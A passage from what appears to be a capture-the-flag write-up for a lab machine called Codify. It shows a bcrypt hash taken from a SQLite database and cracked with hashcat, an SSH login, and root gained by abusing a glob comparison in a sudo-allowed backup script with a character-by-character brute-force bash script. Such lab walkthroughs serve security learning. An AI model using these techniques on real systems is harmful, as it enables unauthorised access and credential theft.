svc        10486  0.0  0.0   6476  2212 pts/0    S+   09:25   0:00 grep --color=auto joshua
```
The user `joshua` is not running anything on the machine.
And for the `root` user:
```
svc@codify:~$ ps aux | grep root
...
root        1130  0.0  0.0   7324  3368 ?        Ss   Mar23   0:00 /usr/sbin/cron -f -P
root        1142  0.0  1.1 1285092 46296 ?       Ssl  Mar23   0:36 /usr/bin/containerd
root        1153  0.0  0.0   6172  1072 tty1     Ss+  Mar23   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1164  0.0  0.2  15424  9232 ?        Ss   Mar23   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        1169  0.0  0.1  43860  7436 ?        Ss   Mar23   0:01 /usr/sbin/apache2 -k start
root        1236  0.0  1.9 1614296 78964 ?       Ssl  Mar23   0:08 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        1562  0.0  0.0   2888  1064 ?        Ss   Mar23   0:00 /bin/sh /root/scripts/other/docker-startup.sh
root        1563  0.0  0.8 190444 33932 ?        Sl   Mar23   0:51 /usr/bin/python3 /usr/bin/docker-compose -f /root/scripts/docker/docker-compose.yml up
root        1643  0.0  0.0 1082092 2972 ?        Sl   Mar23   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3306 -container-ip 172.19.0.2 -container-port 3306
root        1674  0.0  0.3 722280 12816 ?        Sl   Mar23   0:07 /usr/bin/containerd-shim-runc-v2 -namespace moby -id f88b314ed6a4f84693267bda194d6266bdde5798ef5ccd082109b2566fda07f8 -address /run/containerd/containerd.sock
root        9641  0.0  0.2 239640  8736 ?        Ssl  00:55   0:00 /usr/libexec/upowerd
...
```
We can see that a Docker machine is running. The scripts to run the Docker machine are not accessible to the current user:
```
svc@codify:~$ ls -l /root/scripts/other/docker-startup.sh
ls: cannot access '/root/scripts/other/docker-startup.sh': Permission denied
svc@codify:~$ ls -l /root/scripts/docker/docker-compose.yml
ls: cannot access '/root/scripts/docker/docker-compose.yml': Permission denied
```

In the `home` directory, we have the logs from `pm2` but I haven't found anything interesting:
```
svc@codify:~$ ls -al
total 32
drwxr-x--- 4 svc    svc    4096 Sep 26 10:00 .
drwxr-xr-x 4 joshua joshua 4096 Sep 12  2023 ..
lrwxrwxrwx 1 svc    svc       9 Sep 14  2023 .bash_history -> /dev/null
-rw-r--r-- 1 svc    svc     220 Sep 12  2023 .bash_logout
-rw-r--r-- 1 svc    svc    3771 Sep 12  2023 .bashrc
drwx------ 2 svc    svc    4096 Sep 12  2023 .cache
drwxrwxr-x 5 svc    svc    4096 Mar 23 18:06 .pm2
-rw-r--r-- 1 svc    svc     807 Sep 12  2023 .profile
-rw-r--r-- 1 svc    svc      39 Sep 26 10:00 .vimrc
```

If we look at the routes, we can see the interface we identified earlier:
```
svc@codify:~$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.129.0.1      0.0.0.0         UG    0      0        0 eth0
10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0
172.18.0.0      0.0.0.0         255.255.0.0     U     0      0        0 br-030a38808dbf
172.19.0.0      0.0.0.0         255.255.0.0     U     0      0        0 br-5ab86a4e40d0
```

In `/var/www`, I can see there are another site which is `contact`:
```
svc@codify:~$ ls /var/www
contact  editor  html
```
If we look into it, we can see a database:
```
svc@codify:~$ ls -l /var/www/contact/
total 112
-rw-rw-r-- 1 svc svc  4377 Apr 19  2023 index.js
-rw-rw-r-- 1 svc svc   268 Apr 19  2023 package.json
-rw-rw-r-- 1 svc svc 77131 Apr 19  2023 package-lock.json
drwxrwxr-x 2 svc svc  4096 Apr 21  2023 templates
-rw-r--r-- 1 svc svc 20480 Sep 12  2023 tickets.db
```
It seems to be a sqlite database:
```
svc@codify:/var/www/contact$ file tickets.db 
tickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17
```
If we look into it, we can find the hashed password from the user `joshua`:
```
svc@codify:/var/www/contact$ sqlite3 tickets.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
tickets  users  
sqlite> select * from users;
3|joshua|$2a$1[...]2
```
Let's try to bruteforce it while continuing the enumeration:
```
$hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```
Well, it tooks only a few minutes to get the password from the hash:
```
$2a$1[...]2:s[...]1
```
When I tried to use this password to log with SSH, I got the flag:
```
$ssh joshua@10.129.36.69
The authenticity of host '10.129.36.69 (10.129.36.69)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.36.69' (ED25519) to the list of known hosts.
joshua@10.129.36.69's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Mar 24 10:10:41 AM UTC 2024

  System load:                      0.12353515625
  Usage of /:                       66.2% of 6.50GB
  Memory usage:                     25%
  Swap usage:                       0%
  Processes:                        245
  Users logged in:                  0
  IPv4 address for br-030a38808dbf: 172.18.0.1
  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.36.69
  IPv6 address for eth0:            dead:beef::250:56ff:fe94:cf64


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

joshua@codify:~$ cat user.txt 
3[...]4
```
## Privilege escalation
The user `joshua` can run the script `/opt/scripts/mysql-backup.sh` as `root`:
```
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```
This file is read-only:
```
joshua@codify:~$ ls -l /opt/scripts/mysql-backup.sh
-rwxr-xr-x 1 root root 928 Nov  2 12:26 /opt/scripts/mysql-backup.sh
```
This script is password protected:
```
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi
...
```
However, the condition uses pattern matching. Therefore, if `$USER_PASS` is `*`, the "authentication" should pass:
```
joshua@codify:/tmp$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: *
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```
Better, we can deduce the password character by character. For instance, to check if the first letter of the password is `a`, we can write:
```
joshua@codify:/tmp$ echo "a*" | sudo /opt/scripts/mysql-backup.sh

Password confirmation failed!
```
But, if we try `k`:
```
joshua@codify:/tmp$ echo "k*" | sudo /opt/scripts/mysql-backup.sh

Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```
We can write a script that will deduce the password:
```
#!/bin/bash

try_pass() {
  for x in {0..9} {a..z}; do
    if echo "$1$x*" | sudo /opt/scripts/mysql-backup.sh; then
      echo success $1$x
      try_pass $1$x
    fi
  done
}

try_pass ""
```
After running it, we have a password:
```
joshua@codify:/tmp$ ./wrapper.sh 2> /dev/null | grep success
All databases backed up successfully!
success k
[...]
All databases backed up successfully!
success k[...]3
joshua@codify:/tmp$ 
```
We can test it using the mysql command:
```
joshua@codify:/tmp$ /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pk[...]3 
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 140
Server version: 5.5.5-10.10.3-MariaDB-1:10.10.3+maria~ubu2204 mariadb.org binary distribution

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```
This is the correct password. Let's try it on the `root` account:
```
joshua@codify:~$ su root
Password: k[...]3
root@codify:/home/joshua# cat /root/root.txt 
c[...]a
```
We get the flag!
